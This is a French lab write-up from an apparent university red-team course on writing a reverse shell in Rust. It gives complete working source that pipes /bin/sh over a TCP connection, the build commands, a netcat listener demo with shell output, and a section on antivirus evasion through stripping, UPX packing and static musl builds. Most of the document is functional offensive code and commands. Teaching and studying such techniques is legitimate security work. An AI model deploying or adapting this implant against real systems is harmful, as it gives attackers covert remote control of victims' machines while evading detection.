# Write-up — Lab 14 : Rust Red Team — Reverse Shell

> **Embedded Security — Rust Malware Dev**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![Rust](https://img.shields.io/badge/lang-Rust-orange.svg)]()
[![Reverse Shell](https://img.shields.io/badge/technique-reverse%20shell-red.svg)]()
[![AV Evasion](https://img.shields.io/badge/AV-evasion-yellow.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** Implémenter un reverse shell en Rust — langage de plus en plus utilisé en malware dev pour l'évasion AV  
**Technique :** `TcpStream` → dupliquer le fd → `Command::new("/bin/sh")` avec stdin/stdout/stderr redirigés  
**Résultat :** Shell interactif reçu sur le listener netcat

---

## 2. Pourquoi Rust pour le Red Team ?

| Critère | C | Python | Rust |
| --- | --- | --- | --- |
| Détection AV | Moyen | Élevé | **Faible** |
| Binaire statique | Oui | Non | **Oui** |
| Sécurité mémoire | Non | Oui | **Oui** |
| Strip symbols | Manuel | N/A | **Facile** |
| Cross-compilation | Difficile | N/A | **Natif** |

Les moteurs AV ont peu de signatures pour les binaires Rust — le compilateur génère un binaire statique unique difficile à détecter par heuristique.

---

## 3. Code — `revshell/src/main.rs`

```rust
use std::net::TcpStream;
use std::os::unix::io::IntoRawFd;
use std::process::{Command, Stdio};

fn main() {
    let addr = "127.0.0.1:4444";
    let stream = TcpStream::connect(addr).expect("Connexion échouée");
    let fd = stream.into_raw_fd();

    unsafe {
        Command::new("/bin/sh")
            .arg("-i")
            .stdin(Stdio::from_raw_fd(fd))
            .stdout(Stdio::from_raw_fd(fd))
            .stderr(Stdio::from_raw_fd(fd))
            .spawn()
            .expect("Échec spawn shell")
            .wait()
            .expect("Erreur process");
    }
}
```

**Mécanisme :**
1. `TcpStream::connect` — connexion sortante vers le listener
2. `into_raw_fd()` — convertit le socket en file descriptor UNIX
3. `Stdio::from_raw_fd(fd)` × 3 — redirige stdin, stdout, stderr vers le socket
4. `/bin/sh -i` — shell interactif hérite des 3 fds → tout passe par le réseau

---

## 4. Compilation

```bash
cd revshell

# Debug (avec symboles)
cargo build

# Release (optimisé, binaire plus petit)
cargo build --release

# Strip les symboles (évasion AV)
strip target/release/revshell

# Taille comparée
ls -lh target/debug/revshell target/release/revshell
```

---

## 5. Démonstration

**Terminal 1 — Listener :**
```bash
chmod +x handler.sh
./handler.sh
# Listening on 0.0.0.0 4444
```

**Terminal 2 — Cible (simule la victime) :**
```bash
./revshell/target/release/revshell
```

**Terminal 1 — Shell reçu :**
```
Connection received on 127.0.0.1 XXXXX
$ id
uid=1000(angevirus) gid=1000(angevirus) groups=...
$ hostname
AngeVirus
$ whoami
angevirus
```

---

## 6. Analyse réseau

```bash
# Wireshark / tcpdump — voir la connexion TCP
tcpdump -i lo -n port 4444

# strace — voir les syscalls
strace ./revshell/target/release/revshell
# connect(3, {AF_INET, 127.0.0.1:4444}, ...) = 0
# execve("/bin/sh", ["/bin/sh", "-i"], ...) = 0
```

---

## 7. Évasion AV — techniques Rust

```bash
# 1. Strip symbols
strip target/release/revshell

# 2. UPX packing
upx --best target/release/revshell

# 3. Cross-compilation musl (binaire statique pur)
rustup target add x86_64-unknown-linux-musl
cargo build --release --target x86_64-unknown-linux-musl
```

---

## 8. Progression Rust Red Team

| Lab | Technique | Concept |
| --- | --- | --- |
| **Lab14** | **Reverse shell** | **TcpStream + fd redirect** |
| Lab15 | Process injection | ptrace / /proc/pid/mem |
| Lab16 | AMSI bypass | Hook ntdll (Windows) |
| Lab17 | Shellcode loader | mmap + exec |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Langage | Rust 2021 edition |
| Connexion | TcpStream (sortante) |
| Shell | /bin/sh -i |
| Mécanisme clé | `into_raw_fd()` + `Stdio::from_raw_fd()` |
| Avantage | Faible détection AV, binaire statique |

> Screenshot : [docs/lab14_rust_revshell.png](docs/lab14_rust_revshell.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
